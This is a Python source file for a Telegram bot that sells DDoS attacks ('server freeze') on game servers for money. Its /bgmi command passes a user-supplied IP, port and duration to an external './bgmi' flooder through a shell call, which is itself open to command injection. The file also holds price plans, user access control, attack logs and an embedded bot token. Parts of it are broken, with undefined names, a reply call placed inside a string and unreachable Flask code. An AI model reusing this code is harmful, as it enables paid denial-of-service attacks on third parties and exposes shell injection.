#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import time
from threading import Timer
from flask import Flask, request, jsonify


# insert your Telegram bot token here
bot = telebot.TeleBot('6336528768:AAFa7vWHSoPAYSv9PlBAmguK1C7y5fw7ZYM')

# Admin user IDs
admin_id = ["6022173368"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "ᒪOᘜ ᗩᒪᖇᗴᗩᗪY ᗪᗴᒪᗴTᗴᗪ, ᑎO ᒪOᘜ ᗪᗩTᗩ ᖴOᑌᑎᗪ."
            else:
                file.truncate(0)
                response = "ᒪOᘜՏ ᗪᗴᒪᗴTᗴᗪ ՏᑌᑕᑕᗴՏՏᖴᑌᒪᒪY"
    except FileNotFoundError:
        response = "ᑎO ᒪOᘜ ᖴOᑌᑎᗪ."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"ᑌՏᗴᖇ {user_to_add} ՏᑌᑕᑕᗴՏՏᖴᑌᒪᒪY ᗪOᑎᗴ"
            else:
                response = "ᑌՏᗴᖇ ᗩᒪᖇᗴᗩᗪY Iᑎ ᘜᖇOᑌᑭ."
        else:
            response = "ᑭᒪᗴᗩՏᗴ ՏᑭᗴᑕIᖴY ᗩ ᑌՏᗴᖇ Iᗪ"
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"ᑌՏᗴᖇ {user_to_remove} ᖇᗴᗰOᐯᗴᗪ ՏᑌᑕᑕᗴՏՏᖴᑌᒪᒪY✔︎."
            else:
                response = f"ᑌՏᗴᖇ {user_to_remove} ᑎOT ᖴOᑌᑎᗪ Iᑎ ᒪIՏT"
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "ᒪOᘜ ᑕᒪᖇᗴᗩᗪ ᗩᒪᖇᗴᗩᗪY ᑎO ᗰOᖇᗴ ᒪOᘜՏ"
                else:
                    file.truncate(0)
                    response = "ᒪOᘜ ᑕᒪᖇᗴᗩᗪᗴᗪ ✔︎"
        except FileNotFoundError:
            response = "ᒪOᘜ ᗩᒪᖇᗴᗩᗪY ᑕᒪᗴᗩᖇᗴᗪ"
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "ᑎO ᗪᗩTᗩ ᖴOᑌᑎᗪ"
        except FileNotFoundError:
            response = "ᑎO ᗪᗩTᗩ ᖴOᑌᑎᗪ"
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "ᑎO ᗪᗩTᗩ ᖴOᑌᑎᗪ"
                bot.reply_to(message, response)
        else:
            response = "ᑎO ᗪᗩTᗩ ᖴOᑌᑎᗪ"
            bot.reply_to(message, response)
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

import datetime
import subprocess

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f" Տᗴᖇᐯᗴᖇ ᖴᖇᗴᗴᘔᗴ ՏTᗩᖇTᗴᗪ\nIᑭ:{target} \nᑭOᖇT:{port} \nTIᗰᗴ:{time} "
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 180  # 180 seconds cooldown time

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "ᑕOOᒪᗪOᗯᑎ Oᑎ ᗯᗩIT 3 ᗰIᑎᑌTᗴ ."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 151:
                response = "ᗴᖇᖇOᖇ ᗰᗩ᙭ ᗩTTᗩᑕK TIᗰᗴ IՏ 150 ՏᗴᑕOᑎᗪ."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"Տᗴᖇᐯᗴᖇ ᖴᖇᗴᗴᘔᗴ ᗪOᑎᗴ Oᑎ TᕼIՏ Iᑭ:- {target}:{port} /n🇯 🇦 🇮  🇸 🇭 🇷 🇪 🇪  🇷 🇦 🇲  ️"
        
        else:
            response = "☠︎︎ :- /bgmi <target> <port> <time>"  # Updated command syntax


    else:
        response = "ᗷᑌY ᖴᖇOᗰ ᗩᗪᗰIᑎ ♥︎"


    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "㋛︎"
        except FileNotFoundError:
            response = "☹︎"
    else:
        response = "✔︎."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = ''':
 /bgmi : 𝐒𝐄𝐑𝐕𝐄𝐑 𝐅𝐑𝐄𝐄𝐙𝐄. 
 /rules : 𝐑𝐎𝐋𝐄𝐒.
 /mylogs : 𝐀𝐓𝐓𝐀𝐂𝐊 𝐇𝐈𝐒𝐎𝐑𝐘.
 /plan : 𝐃𝐃𝐎𝐒 𝐏𝐋𝐀𝐍𝐒.

 To See Admin Commands:
 /admincmd : OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗘𝗥𝗩𝗘𝗥 𝗙𝗥𝗘𝗘𝗭𝗘 𝗕𝗢𝗧 ☻︎\n𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 /help "
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 

1. ᴇᴋ ᴛɪᴍᴇ ᴍᴀɪ ᴇᴋ ʜɪ ᴀᴛᴛᴀᴄᴋ ᴋʀᴏ
2. ᴅᴏ ɴᴏᴛ sᴘᴀᴍ ɪɴ ᴅᴍ
3.ᴛɪᴍᴇ ᴍɪʟɴᴇ ᴘʀ ʀᴇᴘʟʏ ᴋʀ ᴅᴜɴɢᴀ'''
 
    
      

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ᴘʟᴀɴ ᴘʀɪᴄᴇs
bot.reply_to(message, response)
🇻 🇮 🇵 :
-> 𝑨𝑻𝑻𝑨𝑪𝑲 𝑻𝑰𝑴𝑬 : 150 𝑺𝑬𝑪
> 𝑨𝑭𝑻𝑬𝑹 𝑨𝑻𝑻𝑨𝑪𝑲 𝑾𝑨𝑰𝑻  : 3 Min


𝑷𝑹𝑰𝑪𝑬 𝑳𝑰𝑺𝑻
𝑫𝑨𝒀 :- 100 𝑹𝑺
𝑾𝑬𝑨𝑲 :- 500 𝑹𝑺
𝑴𝑶𝑵𝑻𝑯 :- 1600 𝑹𝑺
𝗰𝗢𝗡𝗧𝗔𝗖𝗞 𝗔𝗗𝗠𝗜𝗡 𝗙𝗢𝗥 𝗗𝗜𝗦𝗖𝗢𝗨𝗡𝗧
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name},ᗩᗪᗰIᑎ ᑕOᗰᗰᗩᑎᗪ ᕼᗴᖇᗴ:

/add <userId> : ᗩᑕᑕᗴՏՏ ᗩ ᑌՏᗴᖇ.
/remove <userid> : KIᑕK ᗩ ᑌՏᗴᖇ.
/allusers : ᑭᖇᗴᗰIᑌᗰ ᑌՏᗴᖇՏ.
/logs : ᗩᒪᒪ ᑌՏᗴᖇ ᗩTTᗩᑕK ᗪᗩTᗩ.
/broadcast : ᗷᖇOᗩᗪᑕᗩՏT ᗩ ᗰᗴՏՏᗩᘜᗴ.
/clearlogs : ᑕᒪᗴᗩᖇ ᒪOᘜՏ ᖴIᒪᗴ.
/setexpire : ՏᗴT TIᗰᗴ ᖴOᖇ ᑌՏᗴᖇ
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "ᗰᗴՏՏᗩᘜᗴ ᖴOᖇᗰ ᗩᗪᗰIᑎ:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"ᗷᖇOᗩᗪᑕᗩՏT Տᗴᑎᗪ ᖴᗩIᒪᗴᗪ {user_id}: {str(e)}")
            response = "ᗷᖇOᗩᗪᑕᗩՏT Տᗴᑎᗪ ՏᑌᑕᑕᗴՏՏᖴᑌᒪᒪY"
        else:
            response = "ᗰᗴՏՏᗩᘜᗴ ᖴOᖇ ᑌՏᗴᖇՏ."
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ"

    bot.reply_to(message, response)

# Function to expire a user after a certain time
def expire_user(user_id):
    if user_id in allowed_user_ids:
        allowed_user_ids.remove(user_id)
        with open(USER_FILE, "w") as file:
            for user_id in allowed_user_ids:
                file.write(f"{user_id}\n")

@bot.message_handler(commands=['setexpire'])
def set_expire_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            expire_minutes = int(command[2])
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                Timer(expire_minutes * 60, expire_user, [user_to_add]).start()
                response = f"ᑌՏᗴᖇ {user_to_add} ᗩᗪᗪᗴᗪ ՏᑌᑕᑕᗴՏՏᖴᑌᒪᒪY ᖴOᖇ {expire_minutes} minutes."
            else:
                response = "ᑌՏᗴᖇ ᗩᒪᖇᗴᗪY ᗴ᙭ITՏ."
        else:
            response = "ᑭᒪᗴᗩՏᗴ ᑌՏᗴ ᗩ ᑌՏᗴᖇ Iᗪ ᗯITᕼ TIᗰᗴ Iᑎ ᗰIᑎᑌTᗴՏ."
    else:
        response = "OᑎᒪY ᖴOᖇ ᗩᗪᗰIᑎ ᑌՏᗴ."
    bot.reply_to(message, response)

bot.polling()

def restart_bot():
    while True:
        try:
            # Specify the filename of your bot script here
            process = subprocess.Popen(['python3', '150.py'])
            process.wait()
        except Exception as e:
            print(f'Bot crashed with error: {e}. Restarting...')
        time.sleep(5)  # Wait for 5 seconds before restarting

if __name__ == "__main__":
    restart_bot()
   
    
app = Flask(__name__)

# Replace this with your actual bot logic function
def handle_start_command(chat_id):
    return f"Welcome to the bot, user {chat_id}!"

@app.route('/start', methods=['POST'])
def start():
    data = request.get_json()
    chat_id = data['chat_id']
    response = handle_start_command(chat_id)
    return jsonify({'response': response})

if __name__ == '__main__':
    app.run(debug=True)
 
    

#By Jai Shree Ram
